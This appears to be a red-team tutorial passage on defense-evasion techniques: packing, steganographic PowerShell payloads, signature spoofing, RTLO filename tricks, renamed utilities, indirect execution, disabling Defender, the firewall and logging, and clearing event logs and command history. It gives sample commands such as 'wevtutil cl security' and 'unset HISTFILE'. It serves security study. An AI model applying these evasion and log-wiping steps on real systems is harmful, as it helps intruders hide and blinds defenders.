![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsVjWOvLZaIJNluMg%2Fimage.png?alt=media&token=7a438485-7076-47b5-83e1-b92334a6b960)

Functionality still stays the same

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhs5rUvanR9TKAxQO7%2F-MRhsWW7leNXnL7WufIk%2Fimage.png?alt=media&token=7de5cb44-d22b-4f55-8947-b7c3a4d8ca5a)

Sometimes this technique is great as the binaries hash and strings change but are decrypted during run time. For more info on this tool do visit

​

[UPX](https://github.com/upx/upx)

### steganography

Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.

Duqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.

By the end of 2017, a threat group used Invoke-PSImage to hide PowerShell commands in an image file (.png) and execute code on a victims system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.

**Example**

Will use the Invoke-PSImage sample where we will simply attach a PS1 Script (PowerUp) and have it check for privilege escalation methods.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsX8IR5_aVZQTsDYN%2F-MRhsc4ewpoDEklsgHd5%2Fimage.png?alt=media&token=7cb95cb0-18ef-4b1d-8024-9e0f78bae6b0)

Something important to remember is that the image has to be Larger than the PS1 Payload Script

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsX8IR5_aVZQTsDYN%2F-MRhscpRkzo0JQVYXRs4%2Fimage.png?alt=media&token=cc093e47-69a8-46ae-a78c-c763757a5d9b)

Once the script is done it will output the one-liner that is needed to execute the payload inside the Image

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsX8IR5_aVZQTsDYN%2F-MRhsdXmqT00Vd67XDIt%2Fimage.png?alt=media&token=b5afb96a-8465-4153-bbc6-b57e82077c25)

And a Successful Shell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsX8IR5_aVZQTsDYN%2F-MRhsebY0qQLJz2gQjMG%2Fimage.png?alt=media&token=470dbbd9-8b7f-4def-b6db-3c83ce9ddfd6)

Of Course there are various methods of Steganography and it doesn't only stop with images these can range from Music Files to Videos as well.

### compile-after-delivery

Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution before execution; typically via native utilities such as csc.exe or GCC/MinGW.

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex:EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with bundled compiler and execution framework.

**Example:**

The .NET Framework includes a mechanism called the Code Document Object Model (CodeDOM) that enables developers of programs that emit source code to generate source code in multiple programming languages at run time, based on a single model that represents the code to render. Sometimes developers need it, and .NET Framework  makes it possible. For example, the following C# code compiles the C# code assigned to the "code" variable during execution and runs it.

Here is a sample code with C#

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsnutbaNHjXSJZhnu%2F-MRhsyQnY_kB2zdLzFZZ%2Fimage.png?alt=media&token=3754db84-8887-44cc-8b4c-e9dbd03493fa)

Any part from the "

**string code"**

 section will get compiled and executed when the application runs.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhsnutbaNHjXSJZhnu%2F-MRhszMGVqK47LM4XYCP%2Fimage.png?alt=media&token=213e22ae-fe64-4cec-b8b6-b984ddf689ff)

Reference:

SpookFlare: Stay In Shadows

with knowledge comes power

### indicator-removal-from-tools

Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tools by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.

**Example:**

This demo is very easy to follow Malware usually gets detected because of Signatures, these are in the AV Database and when the malware touches disk the AV compares it signature to its known DataBase.

For example I will grab the hash of a common payload from msfvenom

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRht-tih1X_m9wcgKUL%2F-MRht8IvYhooAzvdrJUq%2Fimage.png?alt=media&token=d9758fb6-2593-49f6-8e9c-1b5310f03927)

Now with a Hex Editor Tool I will change just 1 Hex Decimal and the Hash will completely change

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRht-tih1X_m9wcgKUL%2F-MRht90OnyPjeE7ECSGZ%2Fimage.png?alt=media&token=1dd04c7f-a5f0-43df-80c4-1a802a182357)

Hash has changed

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRht-tih1X_m9wcgKUL%2F-MRht9oamEDfg2QMMvJR%2Fimage.png?alt=media&token=8eb90e98-96f3-48e0-87d7-5573188f06db)

For Demo purposes I broke the functionality of this payload to demonstrate the hash changing but after some work and testing you can actually change the Hex without breaking functionality. With this there is no need to completely re-write tools or payloads and just remove the offending strings from the binary. In that manner the Hash value will change and be undetectable.

## t1036-masquerading

Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of Masquerading.

### invalid-code-signature

Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.

Unlike Code Signing, this activity will not result in a valid signature.

**Example**

CarbonCopy a tool built by paranoidninja for spoofing Digital Signatures, signatures like these can actually bypass AV and pass undetected by analysts because they provide a level of authenticity. See 2 payloads with and without a Digital Signature.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrIHpfQHfAXo_y_Nx%2F-MRhrJvDBFOpW8yNmgqU%2Fimage.png?alt=media&token=286db1d4-e10f-41ad-8ecb-1b66472ec26a)

Now will check out the digitally signed one a little more to check what it contains.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrIHpfQHfAXo_y_Nx%2F-MRhrKzpTpu4m1cWGr6o%2Fimage.png?alt=media&token=f859d688-6d21-4357-8702-3c9407afc5ee)

A Digital Signature not installed of course this is why we see that it cannot be verified.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrIHpfQHfAXo_y_Nx%2F-MRhrLwoLC143QD9igKH%2Fimage.png?alt=media&token=87f2341b-ff65-4ad4-9695-6f1e94170b58)

We have the option to install this certificate of course with proper permissions but here I am just trying to demonstrate how this "Signature" can provide some level of authenticity since it is Signed by Microsoft, of course a solid analyst can see that this has been valid from a recent Date. So how can we build this digitally signed binary, with CarbonCopy.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrIHpfQHfAXo_y_Nx%2F-MRhrMx5Y99rk9cNczRx%2Fimage.png?alt=media&token=3fb348bc-3e72-4351-a32e-8544867759b1)

Above we see a successful spoofed Signature the requirements for this is very simple the website we are trying to spoof its signature the port the target payload and an output file.

**You will also need OSSLSignedCode tool to be installed.**

References:

Masquerading as a Windows System Binary Using Digital Signatures

F-Secure Labs

### right-to-left-override

Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.

A common use of this technique is with Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been in many targeted intrusion attempts and criminal activity. RTLO can be used in the Windows Registry as well, where regedit.exe display the reverse characters but the command line tool reg.exe does not by default.

**Example:**

Using a tool called Extension Spoofer from henriksb (

[https://github.com/henriksb](https://github.com/henriksb)

https://github.com/henriksb

)

It uses the RTLO to spoof extensions and it as well masquerades the binary by changing its Icon.

The tool is very simple, Run, Choose your Payload and Apply the Spoof extension and the Source Extension.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrOt4UFOFD0Zrhugi%2F-MRhrWTxuAyr6XLUp9rK%2Fimage.png?alt=media&token=f6ffbaf3-41f8-40f9-9b4e-0c7fa5631d61)

We hit Generate and our original file will change with the new extension and spoofed name as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrOt4UFOFD0Zrhugi%2F-MRhrXgpszcbVVJ7_wcQ%2Fimage.png?alt=media&token=21c40f59-5917-4251-b0fe-48b2647199c7)

This was a simple demonstration on how to apply this methodology to trick users in believing they are opening another file this may trick the majority of users since they see an Icon unrelated to EXE and an Extension that is known to not be malicious (

maybe

[maybe](https://github.com/henriksb)

).

### rename-system-utilities

Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe). An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.

**Example**

This technique is very simple, will grab legitimate system utilities and just rename them, sometimes the logging or IDS are looking for specific strings that will prevent execution, but what if instead of calling runddl32 we call 

**"dllexecute"**

 this would be rundll32 but just renamed. The execution and functionality will still be the same but it would bypass defenses since the string is no longer rundll32.

Two different syntax but same results. Since rundll32 has just been renamed but its functionality hasn't been changed.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrZmAjNs2Aieigyok%2F-MRhreii8wW2FkBgOQ98%2Fimage.png?alt=media&token=9eb279f2-2e2b-44e4-8839-a27f92206bdf)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrZmAjNs2Aieigyok%2F-MRhrfw4OlRsVWOLFEdx%2Fimage.png?alt=media&token=972a4bb7-8a98-42bb-8401-4d5cf586a790)

Sometimes renaming utilities is enough to bypass security, in a previous research, it seems that renaming your payload to 

**MSBuild**

 was enough to prevent Defender to scan your payload.

### masquerade-task-or-service

Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.

**Example:**

Sometimes tricking the user that a normal task is being run to trick them that it’s a legitimate service.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrgbLhvXsP2Tb40H4%2F-MRhrmIDblgcoQCMAj1C%2Fimage.png?alt=media&token=a6e51cfa-fc57-4141-b980-8e0e5c7aeb63)

### match-legitimate-name-or-location

Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.

Adversaries may also use the same icon of the file they are trying to mimic.

**Example:**

Here I will mimic rundll32

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhrn-IE2DmoVwvL-bb%2F-MRhrtiPNLVFcJ3q7sk-%2Fimage.png?alt=media&token=a2eb8039-b838-4964-ab6b-00067b7ac3ce)

For the untrained eye we see that they look quite similar in their name but the difference is that rundll32 is now typed with uppercase "

**i**

". This might look similar just typing it here 

**rundll and rundII**

  sometimes it also depends on the type of font it is being used.

## t1202-indirect-command-execution

Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Window utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.

Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads.

**Example**

In this Demo using the forfiles utility which can select multiple files and run a command on them. It is typically used in batch jobs but it could be abused to execute arbitrary command or executable. The parameters "/p" and "/m" are used to perform a search in the windows directory "System32" and on the mask "calc.exe". Anything after "/c" parameter is the actual command that is executed.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqaolOiUB4r0_XhgE%2Fimage.png?alt=media&token=9ff6bdf8-cf0b-4f64-860b-aa42a8233cd4)

Let's check process Explorer and see what happened.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqaCjBd506ikZMrwQ%2Fimage.png?alt=media&token=3857fbb3-1726-4561-9e4a-131ebbc3595a)

We see here the our payload is a child process of the forfiles utility we can also use this with the Windows "Run" and eliminate the use of the command prompt

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqbiyub3tQtyyWnq5%2Fimage.png?alt=media&token=a71f5b3b-b16c-41b0-8231-a32db9608fce)

Even though it's still the child process of forfiles it tools different steps to execute. We also have the pcalua utility to execute commands as well

From the samples from pcaula this can execute binaries, DLL files they can be local and remote since the binary is proxy aware meaning we can also use UNC Paths.

**I was searching for information on why the "-a" parameter but couldn't find any.**

The User will receive a prompt to Run

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqdS9wqp2e4674s0O%2Fimage.png?alt=media&token=14009254-6a85-4663-ba78-506522025d44)

Weird thing though is that the payload executes but Defender manages to Delete and Remove the Payload from the REMOTE SHARE!!.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqeXBuovcadE5uWrK%2Fimage.png?alt=media&token=5f8bb368-5034-4f82-9b0b-fb5316d7c825)

That is the traffic from when the payload is accessed and being DELETED. Even with a normal payload with no obfuscation straight out of the box can give us a connection

PCALUA is nowhere in the Process Explorer since Defender Kills it but our connection is still active as it becomes its own process.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhqYKKbMFpgHUEYVmn%2F-MRhqfTBni64bP_Juphy%2Fimage.png?alt=media&token=9dfe0dce-0857-434f-a3ae-a3c32c4ceb1a)

Reference:

Indirect Command Execution

Penetration Testing Lab

​

[https://twitter.com/KyleHanslovan/status/912659279806640128
](https://twitter.com/KyleHanslovan/status/912659279806640128)

## t1562-impair-defenses

Adversaries may maliciously modify components of a victim environment on order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.

### disable-or-modify-tools

Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.

**Example:**

A method that is great for evasion but very likely to get caught is to simply Disable the Tool for Detection in this sample I will disable Windows Defender to have our payloads safely stay in the target.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhoc5v-UTaYRMcUdif%2F-MRhoo79ua0Sv7SpN4lY%2Fimage.png?alt=media&token=6f919445-de56-4b2a-8cc1-7523d9ed69bf)

In the above image we can see that Defender is Enable. We can easily disable it with PowerShell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhoc5v-UTaYRMcUdif%2F-MRhoopxCjLCYP6Lmcp9%2Fimage.png?alt=media&token=268368f8-471a-4178-9ebd-ba573086d0b2)

We can also use the GUI and defender it normally if we have an RDP session, there was a method to disable this through the Registry Keys but since of August 2020 this has been disabled and Windows Ignored this now

### disable-windows-event-logging

Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creating, and much more. This data is used by security tools and analysis to generate detections.

Adversaries may target system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.

**Example:**

We can also disable the eventlog service from the workstation this can be done with PowerShell but we will need to apply the 

**-Force**

 flag since this service has other services dependent from it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhopYn_fCpSkqplzRE%2F-MRhovTyFjjG_kdUldYd%2Fimage.png?alt=media&token=d4703c85-279e-4da9-816b-de43318eea0c)

We can confirm it with CMD as well and we see that it is unable to start since the service is also disabled, besides being stopped as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhopYn_fCpSkqplzRE%2F-MRhowOtDJVUKL6Lah0Q%2Fimage.png?alt=media&token=5488e4ca-6cb1-475d-a043-79076a4fb0ee)

Set it back how it was is simple.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhopYn_fCpSkqplzRE%2F-MRhoxOSCVBWjJ9WOabO%2Fimage.png?alt=media&token=ec7aa860-805e-4e39-814b-c985854d19b0)

And a restart then all back to normal. As we can see this is a great method to hide our tracks and a progression done in an environment APT have a use for these techniques to evade Defenses

### impair-command-history-logging

Adversaries may impair command history logging to hide commands they run in a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to "ignorespace". HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups" which covers both of the previous examples. This meant that "ls" will not be saved but "ls" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all their terminal commands.

On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\Consolehost_history.txt by default). Adversaries may change where these logs are saved using Set-PsReadLineOption -historySavePath {(FilePATH)}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.

**Example:**

Since cmd has history logging when you hit 

**F7**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhoyhYhl91D-kp659D%2F-MRhpETSZfF3WaGTuf1l%2Fimage.png?alt=media&token=60e8fbd2-b232-4069-ab8b-5c291451f4a2)

Unfortunately for IT people this is only available in the current session once you close cmd the log disappears, but PowerShell we have the ConsoleHost File Log that we previously explained. TO disable the logging is simple.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhoyhYhl91D-kp659D%2F-MRhpFLd1FO5En5MGHJx%2Fimage.png?alt=media&token=d821e36b-17a3-48e3-9e08-db6c27f3427c)

### disable-or-modify-system-firewall

Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modify particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.

**Example:**

Adversaries may modify or disable these firewall rules so that traffic is allowed Inbound/Outbound form the Workstation this can be helpful in Lateral Movement, Exfiltration or just Communication with our C2

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhpFy7dj5zZgpe7Lde%2F-MRhpO1ChvHPhic3H9aD%2Fimage.png?alt=media&token=0be38c85-17b3-46de-8114-e2b28a51b5da)

In the upper image we see our default settings for our Firewall you see that all Inbound Connections are not allowed but can have outbound connections, we see that their state is ON to disable we do the following.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhpFy7dj5zZgpe7Lde%2F-MRhpOzHw7gbW7xj6Lku%2Fimage.png?alt=media&token=22f3b3b7-49d0-44c2-9940-74a131f2ad0e)

As we can see the user receives a pop-up warning that the firewall has been turned off.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhpFy7dj5zZgpe7Lde%2F-MRhpPzuHstH4XXbbnck%2Fimage.png?alt=media&token=506cfa6d-5962-4f8c-adbb-657326079a00)

Firewall Disabled now any outbound and inbound connections are available and other techniques that allow adversaries to achieve malicious intent is also available now.

### indicator-blocking

An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETA), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.

ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.

In the case network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.

Reference:

About Event Tracing - Win32 apps

docsmsft

## t1070-indicator-removal-on-host

Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/*.

These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.

### clear-windows-event-logs

Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are record of a computer's alert and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

The event logs can be cleared with the following utility commands:

·         Wevtutil cl system

·         Wevtutil cl application

·         Wevtutil cl security

These logs may also be cleared through other mechanisms, such as event viewer GUI or PowerShell

**Example:**

Adversaries with high permissions they can clear all their malicious steps taken in an environment, even though not the stealthiest but still a reliable way to remove tracks is to clear the Windows Event Logs, here is a sample on a Logon Event in Windows.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnRiTPIJS7FSQsapk%2F-MRhncXeZXCfVXfrbazs%2Fimage.png?alt=media&token=62c1412b-5a6f-4361-94e0-b0cfc53df963)

That is one example of a User login into the System and hunting for malicious activity, we also have some more in-depth examples with PowerShell we can enable Script Logging and have  a detailed view on what is going on, adversaries tend to use PowerShell for it's In-Memory capability for fileless payloads.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnRiTPIJS7FSQsapk%2F-MRhndabX1qt99U8cDoW%2Fimage.png?alt=media&token=d486545e-5d12-4fb0-884d-b6bb76eb0be4)

In the above sample a user is invoking PowerShell with one common cmdlet to view what processes are running. So let's delete them some common ones "Security" from the logs and remove our tracks showing a clean slate.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnRiTPIJS7FSQsapk%2F-MRhneqj3UE8RKNeU-0u%2Fimage.png?alt=media&token=5283b980-4f56-4cd0-a53f-3b0784856b2c)

Careful as you can see below an Event is Created as well that the logs have been cleared. It even says who did it and the time so be aware of this.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhnRiTPIJS7FSQsapk%2F-MRhnfbV6frgS_gMYNZH%2Fimage.png?alt=media&token=a83bd18c-219c-496d-87b6-925ed3eef186)

Of Course this is not a good thing to do in an environment you are assessing as you are trying to make the Blue Team better, remember be Ethical.

### clear-command-history

In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions.

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the PSReadLine module. The built-in history only tracks the commands used in the current session. The command history is not available to other sessions and is deleted when the session ends.

The PSReadLine command history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt by default). This history since the file is not deleted when the session ends.

Adversaries may run the PowerShell command Clear-History to flush entire command history from a current PowerShell session. This, however, will not delete/flush the ConsoleHost_history.txt file. Adversaries may also delete the Consolehost_history.txt file or edit its contents to hide PowerShell commands they have run.

**Example**

In this Demo for simplicity I will show this in PowerShell such as Linux has its own history files of what commands have been used, PowerShell has something similar as well 

**Console_History**

We can see ithe location of this file with the 

**Get-PSReadLineOption.**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhngXtAeQmdaxZupuH%2F-MRhnmseuT1BCyWRyDNi%2Fimage.png?alt=media&token=1689fd54-95a5-4af9-ab7c-c74e560cd4b8)

Now let's view what History does it have.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhngXtAeQmdaxZupuH%2F-MRhnndHpunNRkVH-rww%2Fimage.png?alt=media&token=eb5a3d0f-cd9f-4a68-9729-76390df7840c)

Adversaries can delete this file as well or empty it, to remove tracks on what has been done during the attack.

### file-deletion

Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary it may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternal Sdelete, or other third-party file deletion tools.

**Example:**

Sometimes adversaries need to delete their traces, and to remove their tracks, also their payloads so they don't get caught and have Security Engineers grab the payload and Reverse Engineer it, they want to avoid this so they don't create a signature and understand how the payload works.

Sometimes a simple 

** del**

  command you can use to remove the file completely and not have it stay in the Recycle Bin.

We see here that if we delete a file regularly as a normal User with it will move to the Recycle Bin

